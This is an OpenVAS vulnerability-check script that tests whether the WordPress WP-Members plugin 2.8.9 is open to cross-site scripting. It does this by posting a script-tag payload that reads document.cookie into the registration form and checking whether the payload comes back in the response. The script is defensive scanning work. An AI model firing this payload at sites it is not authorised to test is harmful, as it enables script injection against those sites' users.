###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress WP-Members Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804059");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2014-01-09 17:04:49 +0530 (Thu, 09 Jan 2014)");
  script_name("WordPress WP-Members Multiple Cross Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"WordPress WP-Members Plugin is prone to multiple cross site scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"solution", value:"Update to version WordPress WP-Members Plugin 2.8.10 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"insight", value:"Flaws are due to input sanitation errors in multiple GET and POST parameter.");
  script_tag(name:"affected", value:"WordPress WP-Members Plugin version 2.8.9, Other versions may also be affected.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");

  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2014010044");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jan/29");
  script_xref(name:"URL", value:"http://wordpress.org/plugins/wp-members/changelog");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-login.php?action=register";

postData = 'user_login=&user_email=&first_name=%27"--></style></script>'+
           '<script>alert(document.cookie)</script>&last_name=&addr1=&addr2=&city'+
           '=&thestate=&zip=&country=&phone1=&redirect_to=&wp-submit=Register';

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData, "\r\n");

res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script>" >< res &&
   ">Register" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
